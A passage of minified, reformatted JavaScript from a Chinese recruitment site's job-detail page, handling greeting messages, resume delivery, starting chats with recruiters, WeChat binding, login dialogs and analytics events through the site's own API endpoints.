                                            var e = window._jobInfo || {};
                                            _T.sendEvent("detial-geek-greeting-click", e.user_id, e.job_id, "1", "")
                                        } catch (e) {}
                                        return o.resolve(!0)
                                    }
                                    var t = $(".greet-sb-list li.active", i).data("id") || "";
                                    try {
                                        e = window._jobInfo || {};
                                        _T.sendEvent("detial-geek-greeting-click", e.user_id, e.job_id, "1", $(".greet-sb-list li.active", i).index() + 1)
                                    } catch (e) {}
                                    $.ajax({
                                        type: "post",
                                        url: "/wapi/zpchat/greeting/updateGreeting",
                                        data: {
                                            status: 1,
                                            templateId: t
                                        },
                                        success: function(e) {
                                            0 == e.code ? o.resolve(!0) : ($.toast({
                                                content: e.message || "招呼语设置失败，请重新尝试",
                                                type: "error"
                                            }),
                                            o.resolve(!1),
                                            Storage.set("greet_already_tip_unique_" + s, ""))
                                        },
                                        error: function() {
                                            $.toast({
                                                content: "招呼语设置失败，请重新尝试",
                                                type: "error"
                                            }),
                                            Storage.set("greet_already_tip_unique_" + s, "")
                                        }
                                    })
                                });
                                var n = "";
                                $.each(a, function(e, t) {
                                    n += '<li data-id="' + (t.encryptId || "") + '" class="' + (0 == e ? "active" : "") + '">' + (t.demo || "") + "</li>"
                                }),
                                n && ($(".greet-sb-list", i).empty().html("<ul>" + n + "</ul>"),
                                $(".greet-sb-list li", i).on("click", function() {
                                    $(this).hasClass("active") || $(this).addClass("active").siblings().removeClass("active")
                                }))
                            }
                        })
                    } else
                        $.toast({
                            content: e.message || "",
                            type: "error"
                        }),
                        o.resolve(!1)
                },
                error: function() {
                    o.resolve(!0)
                }
            })
        } catch (e) {
            o.resolve(!0)
        }
        return o
    },
    sidFlowMask: function() {
        !$("body").hasClass("job-body-wrapper") || -1 == ["bdbp_dasou", "market_zyj"].indexOf(getQueryString("sid")) || $.cookie("sid-flow-mask-close-time") == (new Date).toDateString() || $(".sid-flow-mask").length || ($("body").append(['<div class="sid-flow-mask" ka="sid-flow-mask"><div class="sid-flow-inner">', '<span class="sid-flow-close"></span>', '<img src="https://img.bosszhipin.com/static/file/2022/052wji7td31663926964405.png" class="sid-flow-slogan" />', '<img src="https://img.bosszhipin.com/static/file/2022/yat2qcl4ie1663926964213.png" class="sid-flow-tagline" />', "</div></div>"].join("")),
        Detail.hasSidFlowMask = !0,
        $(".sid-flow-mask .sid-flow-close").off("click").on("click", function(e) {
            e.stopPropagation(),
            $(this).parents(".sid-flow-mask").remove(),
            $.cookie("sid-flow-mask-close-time", (new Date).toDateString(), {
                path: "/",
                expires: 1
            });
            try {
                _T.sendEvent("bdbp_click_close_button")
            } catch (e) {}
        }),
        (window._PAGE || {}).uid || $(".sid-flow-mask").addClass("can-click").on("click", function() {
            var e, t = getQueryObject(), i = (t.sid && delete t.sid,
            location.origin + window.location.pathname);
            for (e in t)
                i += (-1 < i.indexOf("?") ? "&" : "?") + e + "=" + t[e] || "";
            window.location.href = "/web/user/?from=sid-flow-mask&fromUrl=" + encodeURIComponent(i)
        }))
    },
    sidFlowFullMask: function() {
        if (!(window._PAGE || {}).uid && !$(".sid-flow-mask").length)
            if (-1 != ["360daohang_kapian"].indexOf(getQueryString("sid"))) {
                for (var e = ["home-body-wrapper", "school-body-wrapper", "page-gongsi", "job-body-wrapper"], t = !1, i = 0; i < e.length; i++)
                    if ($("body").hasClass(e[i])) {
                        t = !0;
                        break
                    }
                if (-1 < ["cpc_user_job"].indexOf($("#page_key_name").val()) || t) {
                    $("body").addClass("has-sid-mask").append(['<div class="sid-flow-mask" ka="sid-flow-mask"><div class="sid-flow-click" ka="sid_flow_mask_click"></div><span class="ad-tag">广告</span><div class="sid-flow-inner">', '<img src="https://img.bosszhipin.com/static/file/2022/052wji7td31663926964405.png" class="sid-flow-slogan" />', '<img src="https://img.bosszhipin.com/static/file/2022/yat2qcl4ie1663926964213.png" class="sid-flow-tagline" />', "</div></div>"].join(""));
                    try {
                        _T.sendEvent("360-reg-page-expose")
                    } catch (e) {}
                    Detail.hasSidFlowMask = !0,
                    $(".sid-flow-mask .sid-flow-click").off("click").on("click", function() {
                        ShowLoginDialog.showBossLogin({
                            params: {
                                pk: $(this).attr("ka") || "",
                                eventLog: {
                                    p: $(this).attr("ka") || ""
                                }
                            }
                        })
                    })
                }
            }
    },
    checkAcceptInvite: function(i, n, e) {
        var a = e || {};
        $.ajax({
            type: "GET",
            url: "/wapi/zprelation/interview/geek/accept/precheck.json",
            dataType: "json",
            data: {
                bossId: i.data("boss"),
                bossSource: a.bossSource || 0
            },
            success: function(e) {
                var t = e.zpData;
                0 == e.code && ((Attachment.attachmentList = t).hasInterviewed || n ? Detail.beforeAcceptInvite(i, t, a) : Detail.showInviteTip(i, t, a))
            }
        })
    },
    beforeAcceptInvite: function(t, e, i) {
        e.hasSend ? Detail.acceptInvite(t, "", i) : 1 < e.resumeCount ? Attachment.showResumeSelecter(e, {
            callbackConfirm: function(e) {
                Detail.acceptInvite(t, e, i)
            }
        }) : (e = e.resumeList[0] ? e.resumeList[0].resumeId : "",
        Detail.acceptInvite(t, e, i))
    },
    popupGuide: function() {
        window._jobInfo && $.ajax({
            type: "get",
            url: "/wapi/zpgeek/jobdetail/popupguides/query.json",
            data: {
                jobId: (window._jobInfo || {}).job_id
            },
            success: function(e) {
                var i, n;
                0 == e.code && e.zpData && (i = e.zpData || {},
                n = i.data || {},
                -1 < [1, 12].indexOf(+i.popupType) && (e = "有这个证书",
                12 == i.popupType && (e = "去上传"),
                $.dialog({
                    content: i.content || "",
                    title: i.title || "提示",
                    cancelText: "还没有",
                    confirmText: e,
                    wrapClass: "popup-guide-dialog",
                    onOpen: function() {
                        $.ajax({
                            type: "post",
                            url: "/wapi/zpgeek/jobdetail/popupguides/close.json",
                            data: {
                                popupType: i.popupType,
                                positionCode: i.positionCode
                            }
                        })
                    },
                    onConfirm: function(e) {
                        var t = window.location.href || "/";
                        1 == i.popupType && (t = "/web/geek/resume?editItem=certification&categoryName=" + (n.categoryName || "") + "&positionName=" + (n.positionName || "") + "&redirectUrl=" + encodeURIComponent(location.href)),
                        12 == i.popupType && (t = "/web/geek/resume?editItem=work-display-designWorks&redirectUrl=" + encodeURIComponent(location.href)),
                        location.replace(t)
                    }
                })))
            }
        })
    },
    pushJobLocal: function() {
        var i, e;
        "undefined" != typeof _jobInfo && function() {
            var t = !0;
            try {
                t = !!window.localStorage
            } catch (e) {
                t = !1
            }
            return t
        }() && _jobInfo && (e = Storage.get("_Job_History"),
        i = [],
        $.each(e, function(e, t) {
            8 < e || t.job_id != _jobInfo.job_id && i.push(t)
        }),
        e = {
            job_id: _jobInfo.job_id,
            storage_expire_time: (new Date).getTime() + 12096e5
        },
        i.unshift(e),
        Storage.set("_Job_History", i))
    },
    showGrabTip: function(e) {
        $.dialog({
            content: '<div class="tip-text">抱歉，该职位当前无法投递</div>',
            title: "提示",
            type: "warning",
            closeText: !1,
            cancelText: "取消",
            confirmText: "查看推荐职位",
            wrapClass: "",
            onOpen: function(e) {},
            onConfirm: function(e) {
                window.location.href = "/job_detail/"
            }
        }),
        e.text("投递简历").removeClass("btn-loading")
    },
    postDeliveResume: function(n, a) {
        var o = a;
        n.attr("data-url");
        $.ajax({
            url: "/wapi/zpgeek/resume/onekeydeliver.json",
            data: o,
            type: "post",
            dataType: "json",
            success: function(e) {
                var t, i;
                0 === e.code ? $.dialog({
                    content: '<div class="tip-text">您的附件简历已经发送给Boss，请静候佳音。</div>',
                    title: "投递成功",
                    type: "success",
                    cancelText: "",
                    autoTime: 4,
                    confirmText: "确定",
                    wrapClass: "",
                    onOpen: function(e) {
                        $(".btn-sendresume").text("已投递").removeClass("btn-loading").addClass("btn-disabled")
                    },
                    onConfirm: function(e) {
                        e.remove()
                    }
                }) : 1 === e.code ? (e.zpData.bizCode,
                t = e.zpData.bizMessage,
                (i = e.zpData.bizData).chatRemindDialog ? ($.extend(o, {
                    cid: 1
                }),
                Detail.showBlockDialog(i.chatRemindDialog, n, 17, a.resumeId, o)) : $.toast({
                    content: t,
                    type: "error"
                })) : 24 === e.code || 7 == e.code || 1011 === e.code ? ShowLoginDialog.showBossLogin({
                    params: {
                        pk: n.attr("ka") || ""
                    }
                }) : $.toast({
                    content: e.message,
                    type: "error"
                })
            },
            error: function(e) {
                $.toast({
                    content: "请稍后再试",
                    type: "error"
                })
            }
        })
    },
    deliveResume: function(i, e, n) {
        e = e || i.attr("data-url"),
        i.attr("redirect-url"),
        e = e.replace("/gchat/deliveryResume.json", "/wapi/zpgeek/resume/onekeydeliver.json");
        i.hasClass("btn-loading") || i.hasClass("btn-disabled") || (i.html('<i class="icon-loading"></i>投递中').addClass("btn-loading"),
        Detail.getQueryParams(e).resumeId || (e = e + "&resumeId=" + n),
        $.ajax({
            url: e,
            type: "post",
            dataType: "json",
            success: function(e) {
                var t = e.zpData || {};
                0 === e.code ? $.dialog({
                    content: '<div class="tip-text">您的附件简历已经发送给Boss，请静候佳音。</div>',
                    title: "投递成功",
                    type: "success",
                    cancelText: "",
                    autoTime: 4,
                    confirmText: "确定",
                    wrapClass: "",
                    onOpen: function(e) {
                        $(".btn-sendresume").text("已投递").removeClass("btn-loading").addClass("btn-disabled"),
                        $(i).text("已投递").removeClass("btn-loading").addClass("btn-disabled")
                    },
                    onConfirm: function(e) {
                        e.remove()
                    }
                }) : t.bizCode ? 1 == t.bizCode ? (Detail.showBlockDialog(t.bizData.chatRemindDialog, i, 2, n),
                i.text("投递简历").removeClass("btn-loading")) : 2 == t.bizCode ? Detail.showGrabTip(i) : $.dialog({
                    content: '<div class="tip-text">' + t.resmsg + "</div>",
                    title: "您不太符合该boss的要求",
                    type: "warning",
                    closeText: !1,
                    cancelText: "再看看",
                    confirmText: "继续投递",
                    wrapClass: "",
                    onConfirm: function(e) {
                        e.remove(),
                        location.reload()
                    }
                }) : 1011 == e.code || 7 == e.code ? (ShowLoginDialog.showBossLogin({
                    params: {
                        pk: i.attr("ka") || ""
                    }
                }),
                i.text("投递简历").removeClass("btn-loading")) : 1 == e.code ? $.dialog({
                    content: e.message,
                    title: "",
                    type: "warning",
                    closeText: !1,
                    cancelText: !1,
                    confirmText: "确定",
                    wrapClass: "",
                    onConfirm: function(e) {
                        e.remove(),
                        location.reload()
                    }
                }) : ($.dialog({
                    content: e.message,
                    title: "",
                    type: "warning",
                    closeText: !1,
                    cancelText: !1,
                    confirmText: "确定",
                    wrapClass: "",
                    onConfirm: function(e) {
                        e.remove()
                    }
                }),
                i.text("投递简历").removeClass("btn-loading"))
            },
            error: function(e) {
                i.text("投递简历").removeClass("btn-loading")
            }
        }))
    },
    continueChat: function(t, i) {
        var e = (t.attr("data-url") || "").split("?")[1] || ""
          , n = t.attr("redirect-url")
          , a = {};
        $.each(e.split("&"), function(e, t) {
            t = (t || "").split("=");
            t[0] && t[1] && (a[t[0]] = t[1])
        }),
        $.ajax({
            type: "POST",
            url: "/wapi/zpgeek/friend/continuechat.json",
            data: a,
            success: function(e) {
                0 == e.code && e.zpData && !e.zpData.notFriend ? window.location.href = n : (t.attr("data-isfriend", !1),
                Detail.startChat(t, "", i))
            },
            error: function() {
                t.attr("data-isfriend", !1),
                Detail.startChat(t, "", i)
            }
        })
    },
    startChat: function(i, e, n) {
        n = n || {};
        var a, o = "true" == i.attr("data-isfriend");
        o ? Detail.continueChat(i, n) : (e = e || i.attr("data-url"),
        a = i.attr("redirect-url"),
        i.hasClass("btn-disabled") || (i.addClass("btn-disabled"),
        $.ajax({
            type: "POST",
            url: e,
            dataType: "JSON",
            data: null,
            success: function(e) {
                var t;
                0 == e.code ? (!o && e.zpData && e.zpData.greeting ? t = $.dialog({
                    content: '<div class="greet-con" id="greet">' + e.zpData.greeting + "</div><span>如需修改打招呼内容，请在【账号设置-设置招呼语】页面修改</span>",
                    title: "已向BOSS发送消息",
                    closeText: !1,
                    cancelText: "留在此页",
                    confirmText: "继续沟通",
                    inline: !0,
                    wrapClass: "greet-pop",
                    closeLayer: !1,
                    onOpen: function(t) {
                        t.find(".verify-box img").on("click", function() {
                            $(this).attr("src", "/wapi/zppassport/captcha/?randomKey=" + $(this).siblings(".randomkey").val() + "&_r=" + (new Date).getTime())
                        }),
                        t.find("#fileupload").on("click", function(e) {
                            !$(this).next(".verify-box") || _this.checkForm($(".verify-box")) ? _this.uploadPicture($(this), t) : e.preventDefault()
                        })
                    },
                    onConfirm: function(e) {
                        try {
                            _T.sendEvent("go_greet_done_continue")
                        } catch (e) {}
                        window.location.href = a
                    },
                    onCancel: function() {
                        try {
                            _T.sendEvent("go_greet_done_cancel")
                        } catch (e) {}
                        t.close("cancel")
                    }
                }) : window.location.href = a,
                i.attr("data-isfriend", !0).text("继续沟通"),
                i.removeClass("btn-disabled")) : 7 == e.code || 1011 == e.code ? (ShowLoginDialog.showBossLogin({
                    parmas: {
                        pk: i.attr("ka") || ""
                    },
                    success: n.loginSuccess
                }),
                i.removeClass("btn-disabled")) : 1 == e.code ? e.zpData && 1 == e.zpData.bizCode ? (Detail.showBlockDialog(e.zpData.bizData.chatRemindDialog, i, 1),
                i.removeClass("btn-disabled")) : e.zpData && 2 == e.zpData.bizCode ? Detail.showGrabTip(i) : ($.toast({
                    content: e.message,
                    type: "error"
                }),
                i.removeClass("btn-disabled")) : 24 == e.code ? ($.toast({
                    content: "请到APP中切换到牛人身份后再重试",
                    type: "error"
                }),
                i.removeClass("btn-disabled")) : 25 == e.code ? (i.removeClass("btn-disabled"),
                Detail.chatToGuide()) : ($.toast({
                    content: e.message,
                    type: "error"
                }),
                i.removeClass("btn-disabled")),
                n.succ && n.succ(e)
            },
            error: function(e) {
                i.removeClass("btn-disabled"),
                n.fail && n.fail()
            }
        })))
    },
    openChatDialog: function(n, e, a) {
        var o, t, e = e || n.attr("data-url");
        function s() {
            $("body .page-chat-loading").remove()
        }
        redirectUrl = n.attr("redirect-url"),
        a = a || {},
        "javascript:;" != n.attr("href") || n.hasClass("btn-disabled") || (n.addClass("btn-disabled"),
        t = $('<div class="page-chat-loading"><img class="loading-img" src="https://static.zhipin.com/v2/web/geek/images/loading.gif"></div>'),
        $("body").append(t),
        $.ajax({
            type: "POST",
            url: e,
            dataType: "JSON",
            data: null
        }).then(function(e) {
            var t, i;
            return 0 == e.code ? (i = $(".job-banner .btn-container .btn.btn-startchat"),
            t = $(".smallbanner .btns .btn.btn-startchat"),
            i.text("继续沟通").attr("data-isfriend", !0),
            i.removeClass("btn-disabled"),
            t.text("继续沟通").attr("data-isfriend", !0),
            t.removeClass("btn-disabled"),
            i = e.zpData || {},
            o = i.greeting,
            $.ajax({
                type: "POST",
                url: "/wapi/zpchat/geek/getBossData",
                dataType: "JSON",
                data: {
                    bossId: i.encBossId,
                    securityId: i.securityId,
                    bossSrc: i.bossSource
                }
            })) : (t = n,
            i = (i = a) || {},
            7 == (e = e).code || 1011 == e.code ? (ShowLoginDialog.showBossLogin({
                params: {
                    pk: t.attr("ka") || ""
                },
                success: i.loginSuccess
            }),
            t.removeClass("btn-disabled")) : 1 == e.code ? e.zpData && 1 == e.zpData.bizCode ? (Detail.showBlockDialog(e.zpData.bizData.chatRemindDialog, t, 33),
            t.removeClass("btn-disabled")) : e.zpData && 2 == e.zpData.bizCode ? Detail.showGrabTip(t) : ($.toast({
                content: e.message,
                type: "error"
            }),
            t.removeClass("btn-disabled")) : 24 == e.code ? ($.toast({
                content: "请到APP中切换到牛人身份后再重试",
                type: "error"
            }),
            t.removeClass("btn-disabled")) : 25 == e.code ? (t.removeClass("btn-disabled"),
            Detail.chatToGuide()) : ($.toast({
                content: e.message,
                type: "error"
            }),
            t.removeClass("btn-disabled")),
            $.Deferred().reject("开聊失败"))
        }).then(function(e) {
            var i;
            0 == e.code && ((e = e.zpData.data || {}).greeting = o,
            Detail.chatDialog(e),
            e = e.securityId,
            i = "",
            $.ajax({
                type: "POST",
                url: "/wapi/zpchat/wechat/getScanMixInfo",
                dataType: "JSON",
                data: {
                    securityId: e,
                    sceneType: 1
                }
            }).then(function(e) {
                var t;
                0 == e.code && (t = e.zpData.qrcode,
                e = e.zpData.wxNotifyStatus,
                t || 1 !== e ? i = "/wflow/zpweixin/qrcode/getqrcode?w=180&h=180&content=" + t : (i = staticPath + "/web/geek/images/start_chat_default_qrcode.jpg",
                $(".startchat-dialog .startchat-content .right .title").text("已开启消息订阅"),
                $(".startchat-dialog .startchat-content .right .sub-title").text("小程序也能继续回复BOSS信息"),
                $(".startchat-dialog .startchat-content .right .tip").text("使用微信扫码")),
                $(".startchat-dialog .startchat-content .img-container .wechat-qrcode").attr("src", i).removeClass("loading"))
            }),
            s())
        }).fail(function(e) {
            n.removeClass("btn-disabled"),
            s()
        }))
    },
    chatToGuide: function() {
        var e, t, i;
        e = $.Deferred(),
        t = !1,
        i = (window._jobInfo || {}).job_id || "",
        $.ajax({
            type: "get",
            url: "/wapi/zpgeek/complete/quicksimplecomplete/check.json",
            data: {
                jobId: i
            },
            success: function(e) {
                t = 0 == e.code && e.zpData && 1 == e.zpData.quickSimpleComplete
            },
            complete: function() {
                e.resolve(t)
            }
        }),
        e.then(function(e) {
            var t, i, n = "/web/geek/guide";
            e && (e = window._jobInfo || {},
            t = getQueryString("lid") || "",
            i = getQueryString("sessionId") || "",
            n = "/web/geek/simple-complete?jobId=" + (e.job_id || "") + "&encryptBossId=" + (e.user_id || "") + "&securityId=" + (e.securityId || "") + "&lid=" + t + "&sessionId=" + i),
            window.location.href = n
        })
    },
    chatDialog: function(i) {
        var s = {
            uid: i.bossId,
            source: i.bossSource,
            encryptUid: i.encryptBossId
        }
          , e = '<div class="startchat-title">    <img class="avatar" src="' + i.tinyUrl + '">    <div class="boss-info">        <div class="name">' + i.name + '</div>        <div class="position">' + i.companyName + "·" + i.title + "</div>    </div></div>";
        function r(e, t) {
            t = t || "sending";
            var i = $(".startchat-content .message > .message-list")
              , e = $('<li class="message-item"><span class="status"></span><p class="text">' + e + "</p></li>");
            return c(e, t),
            i.append(e),
            i.animate({
                scrollTop: i.prop("scrollHeight")
            }, 500),
            e
        }
        function c(e, t) {
            var i = ["sending", "success", "error"]
              , n = {
                sending: "发送中",
                success: "已发送",
                error: "失败"
            };
            e = e.find(".status");
            for (var a = 0; a < i.length; a++)
                i[a] !== t && e.removeClass(i[a]),
                e.addClass(t).text(n[t])
        }
        $.dialog({
            title: e,
            content: '<div class="startchat-content">    <div class="left">        <div class="message">            <ul class="message-list"></ui>        </div>        <div class="edit-area">            <textarea class="input-area" placeholder="请简短描述您的问题"></textarea>            <div class="send-message disable">发送</div>        </div>    </div>    <div class="right">        <div class="title">订阅回复消息</div>        <div class="desc sub-title">在微信上实时收到他的回复</div>        <div class="img-container">             <img class="wechat-qrcode loading" src="https://static.zhipin.com/v2/web/geek/images/loading.gif">        </div>        <div class="desc tip">使用微信扫码订阅</div>    </div></div>',
            cancelText: "",
            confirmText: "",
            closeText: !0,
            inline: !1,
            wrapClass: "startchat-dialog",
            closeLayer: !1,
            onOpen: function(e) {
                var n, a = e.find(".input-area"), o = e.find(".send-message");
                function t() {
                    var e, t, i;
                    n && n.length && (t = r(e = n),
                    "EventBus"in window && ((i = s).message = e,
                    EventBus.publish("CHAT_SEND_TEXT", i, function(e) {
                        t.attr("id", e),
                        c(t, "success")
                    }, function(e) {
                        t.attr("id", e),
                        c(t, "error")
                    })),
                    a.val(""),
                    n = "",
                    o.addClass("disable"))
                }
                i.greeting && r(i.greeting, "success"),
                a.on("input", function() {
                    (n = filterXss(n = a.val().trim())).length ? o.removeClass("disable") : o.addClass("disable")
                }),
                o.on("click", function() {
                    t()
                }),
                e.on("keydown", function(e) {
                    13 !== e.keyCode || e.shiftKey || e.preventDefault()
                }),
                e.on("keyup", function(e) {
                    13 !== e.keyCode || e.shiftKey || t()
                })
            }
        })
    },
    sendWetchatAction: function(o) {
        $.ajax({
            type: "GET",
            url: "/wapi/zpuser/wap/weChat/exist",
            dataType: "JSON",
            success: function(e) {
                if (0 == e.code && e.zpData) {
                    Detail.sendPhoneOrWechat(o);
                    try {
                        var t = Detail.getQueryString("jobId", o.attr("data-url"));
                        (i = (window._PAGE || {}).uid || "") && _T.sendEvent("biz-item-topcard-quicksend", t, i + "", "2", "1")
                    } catch (e) {}
                } else if (7 == e.code || 1011 == e.code)
                    ShowLoginDialog.showBossLogin({
                        params: {
                            pk: o.attr("ka") || ""
                        }
                    });
                else {
                    try {
                        var i, t = Detail.getQueryString("jobId", o.attr("data-url"));
                        (i = (window._PAGE || {}).uid || "") && _T.sendEvent("biz-item-topcard-quicksend", t, i + "", "2", "2")
                    } catch (e) {}
                    var a = $.dialog({
                        content: '<div class="bindwechat-form"><input class="wetchat-input" placeholder="输入您的微信" /><span class="tip">微信号填写要求：可使用6-20位大小写字母、数字、下划线和减号，不支持输入中文</span></div>',
                        title: "输入微信",
                        cancelText: "取消",
                        confirmText: "确定",
                        wrapClass: "job-bindwechat-dialog",
                        onOpen: function(e) {},
                        onClose: function() {
                            try {
                                var e = Detail.getQueryString("jobId", o.attr("data-url"))
                                  , t = (window._PAGE || {}).uid || "";
                                _T.sendEvent("biz-item-topcard-addwechatpop", e, t + "", "2")
                            } catch (e) {}
                        },
                        onConfirm: function(e) {
                            var t = $(".job-bindwechat-dialog .wetchat-input").val() || "";
                            try {
                                var i = Detail.getQueryString("jobId", o.attr("data-url"))
                                  , n = (window._PAGE || {}).uid || "";
                                _T.sendEvent("biz-item-topcard-addwechatpop", i, n + "", "1", "" == t.replace(/(^\s*)|(\s*$)/g, "") ? "0" : "1")
                            } catch (e) {}
                            $.ajax({
                                type: "GET",
                                url: "/wapi/zpuser/wap/weChat/update",
                                data: {
                                    weixin: t
                                },
                                dataType: "JSON",
                                success: function(e) {
                                    0 == e.code ? (a.hide(),
                                    Detail.sendPhoneOrWechat(o)) : ($.toast({
                                        type: "error",
                                        content: e.message || ""
                                    }),
                                    o.removeClass("btn-disabled"))
                                },
                                error: function() {
                                    o.removeClass("btn-disabled")
                                }
                            })
                        }
                    });
                    o.removeClass("btn-disabled")
                }
            },
            error: function() {
                o.removeClass("btn-disabled")
            }
        })
    },
    sendPhoneOrWechat: function(t) {
        var e = (t = t).attr("data-url")
          , i = t.attr("data-send-url")
          , n = t.attr("redirect-url");
        "javascript:;" != t.attr("href") || t.hasClass("btn-disabled") || (t.addClass("btn-disabled"),
        $.ajax({
            type: "POST",
            url: e,
            dataType: "JSON",
            data: null,
            success: function(e) {
                0 == e.code ? $.ajax({
                    type: "POST",
                    url: i,
                    dataType: "JSON",
                    data: null,
                    success: function(e) {
                        0 == e.code ? (t.removeClass("btn-disabled"),
                        window.location.href = n) : 7 == e.code || 1011 == e.code ? (ShowLoginDialog.showBossLogin({
                            params: {
                                pk: t.attr("ka") || ""
                            }
                        }),
                        t.removeClass("btn-disabled")) : 1 == e.code ? e.zpData && 1 == e.zpData.bizCode ? (Detail.showBlockDialog(e.zpData.bizData.chatRemindDialog, t, 1),
                        t.removeClass("btn-disabled")) : e.zpData && 2 == e.zpData.bizCode ? Detail.showGrabTip(t) : ($.toast({
                            content: e.message,
                            type: "error"
                        }),
                        t.removeClass("btn-disabled")) : 24 == e.code ? ($.toast({
                            content: "请到APP中切换到牛人身份后再重试",
                            type: "error"
                        }),
                        t.removeClass("btn-disabled")) : 25 == e.code ? (t.removeClass("btn-disabled"),
                        window.location.href = "/web/geek/guide") : ($.toast({
                            content: e.message,
                            type: "error"
                        }),
                        t.removeClass("btn-disabled"))
                    },
                    error: function(e) {
                        t.removeClass("btn-disabled")
                    }
                }) : 7 == e.code || 1011 == e.code ? (ShowLoginDialog.showBossLogin({
                    params: {
                        pk: t.attr("ka") || ""
                    }
                }),
                t.removeClass("btn-disabled")) : 1 == e.code ? e.zpData && 1 == e.zpData.bizCode ? (Detail.showBlockDialog(e.zpData.bizData.chatRemindDialog, t, 1),
                t.removeClass("btn-disabled")) : e.zpData && 2 == e.zpData.bizCode ? Detail.showGrabTip(t) : ($.toast({
                    content: e.message,
                    type: "error"
                }),
                t.removeClass("btn-disabled")) : 24 == e.code ? ($.toast({
                    content: "请到APP中切换到牛人身份后再重试",
                    type: "error"
                }),
                t.removeClass("btn-disabled")) : 25 == e.code ? (t.removeClass("btn-disabled"),
                window.location.href = "/web/geek/guide") : ($.toast({
                    content: e.message,
                    type: "error"
                }),
                t.removeClass("btn-disabled"))
            },
            error: function(e) {
                t.removeClass("btn-disabled")
            }
        }))
    },
    sendEventAction: function(e, t) {
        $.ajax({
            type: "POST",
            url: "/wapi/zpCommon/actionLog/geek/chatremind.json",
            data: {
                ba: e.ba,
                action: t
            },
            dataType: "JSON",
            success: function(e) {}
        })
    },
    sendAction: function(e) {
        $.ajax({
            type: "POST",
            url: "/wapi/zpCommon/actionLog/common.json",
            data: {
                ba: JSON.stringify(e)
            },
            dataType: "JSON",
            success: function(e) {}
        })
    },
    showBlockDialog: function(i, n, a, o, s) {
        Detail.sendEventAction(i, "addf-limit-popup-c");
        var e = i.title
          , t = i.content
          , r = i.buttonList
          , c = i.remindType
          , l = ""
          , t = {
            content: "<p>" + t + "</p>" + (l = i.showNotRemind ? "<div class='remindType'><label><input type='checkbox'>不再提醒</label></div>" : l),
            title: e,
            closeText: !1,
            cancelText: 2 === r.length && r[0].text,
            confirmText: (2 === r.length ? r[1] : r[0]).text,
            inline: !0,
            wrapClass: "greet-pop",
            closeLayer: !1,
            onOpen: function(e) {},
            onConfirm: function(e) {
                if (i.showNotRemind && $(".remindType input:checked").length && Detail.sendRemindType(c),
                d.close(),
                2 == c)
                    1 == a ? Detail.startChat(n, r[1].webUrl) : 33 === a ? Detail.openChatDialog(n, r[1].webUrl) : 17 == a ? Detail.postDeliveResume(n, s) : Detail.deliveResume(n, r[1].webUrl, o);
                else if (1024 == c)
                    Detail.userBlackDelete(n);
                else {
                    2 === r.length ? window.open(r[1].webUrl) : r[0].url && window.open(r[0].webUrl);
                    try {
                        var t = {};
                        i.ba && (t = JSON.parse(decodeURIComponent(i.ba))),
                        2 === r.length ? t.p8 = r[1].actionType + "" : 1 === r.length && (t.p8 = r[0].actionType + ""),
                        t.action = "addf-limit-popup-connect",
                        Detail.sendAction(t)
                    } catch (e) {}
                }
            }
        }
          , d = (2 === r.length && (t.onCancel = function() {
            if (d.close(),
            2 === r.length)
                if (4 == c)
                    17 == a ? Detail.postDeliveResume(n, s) : 33 === a ? Detail.openChatDialog(n, r[0].webUrl) : Detail.startChat(n, r[0].webUrl);
                else {
                    r[0].url && window.open(r[0].webUrl);
                    try {
                        var e = {};
                        i.ba && (e = JSON.parse(decodeURIComponent(i.ba))),
                        r[0] && (e.p8 = r[0].actionType + ""),
                        e.action = "addf-limit-popup-connect",
                        Detail.sendAction(e)
                    } catch (e) {}
                }
        }
        ),
        $.dialog(t))
    },
    userBlackDelete: function(e) {
        e = Detail.getQueryString("securityId", e.attr("data-url"));
        $.ajax({
            type: "POST",
            url: "/wapi/zprelation/userBlack/delete",
            data: {
                securityId: e
            },
            success: function(e) {
                0 == e.code && e.zpData && e.zpData.result && $.toast({
                    content: "解除成功",
                    type: "success"
                })
            }
        })
    },
    sendRemindType: function(e) {
        $.ajax({
            type: "POST",
            url: "/wapi/zpgeek/chatremind/shownomore/set.json",
            data: {
                remindType: e
            },
            dataType: "json",
            success: function(e) {}
        })
    },
    showSign: function(n) {
        var e;
        ShowLoginDialog.isShowLogin || Detail.isShowSign || (n = n || {},
        e = "pop-sign-box",
        $(".sign-wrap").hasClass("sign-wrap-v2") && (e += " sign-wrap-v2"),
        $.confirm({
            content: $(".sign-wrap:hidden").html(),
            title: !1,
            confirmButton: !1,
            cancelButton: !1,
            closeIcon: !0,
            backgroundDismiss: !1,
            columnClass: e,
            onOpen: function() {
                Detail.isShowSign = !0,
                Sign.init(this.$content),
                this.$content.find(".sign-register").show(),
                this.$content.find(".sign-register").find(".verifyimg").click();
                var e = "verrify" + Math.random().toString(32).substr(-10, 6)
                  , t = this.$content.find(".sign-form:visible").find(".row-code");
                t.attr("id", e),
                new VerifyCodeSDK({
                    dom: t[0],
                    success: function(e) {
                        Sign.VerrifySuccessCallback(e)
                    },
                    ready: function(e) {
                        Sign.VerrifyReadyCallback(e)
                    },
                    fail: function(e) {
                        try {
                            e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                        } catch (e) {}
                    }
                });
                n.customTitle && this.$content.find(".sign-register .title").text(n.customTitle).show();
                try {
                    var i = n.eventLog || {};
                    _T.sendEvent("web_pop_login", i.p || "", i.p2 || "no_block")
                } catch (e) {}
            },
            onClose: function() {
                Detail.isShowSign = !1,
                Sign.interCount && (clearInterval(Sign.interCount),
                Sign.interCount = null);
                try {
                    var e = n.eventLog || {};
                    _T.sendEvent("web_pop_login_cancel", e.p || "", e.p2 || "no_block")
                } catch (e) {}
            }
        }))
    },
    showMes: function() {
        var i;
        _userInfo.isLogin && _userInfo.isPerfect || (i = $(".message"),
        Detail.canClick = !1,
        $.each(_userInfo.text, function(e, t) {
            i.find(".text").eq(e).html(t)
        }),
        Detail.firstIn ? (setTimeout(function() {
            $(".container-mes").fadeIn(),
            $(".container-mes").find(".avatar").css("display", "block")
        }, 1e3),
        setTimeout(function() {
            i.css("top", "40px"),
            i.fadeIn(),
            i.find("li").eq(0).fadeIn()
        }, 1800),
        setTimeout(function() {
            i.find("li").eq(1).fadeIn()
        }, 2600),
        setTimeout(function() {
            i.find("li").eq(2).fadeIn(),
            Detail.canClick = !0
        }, 3400),
        Detail.firstIn = !1) : (i.css("top", "40px"),
        i.fadeIn(200),
        $(".container-mes").find(".avatar").fadeIn(200),
        Detail.canClick = !0))
    },
    showTip: function() {
        var e;
        _userInfo.isLogin && _userInfo.isPerfect || !_userInfo.showTip || (e = $(".avatar img"),
        Detail.canClick = !1,
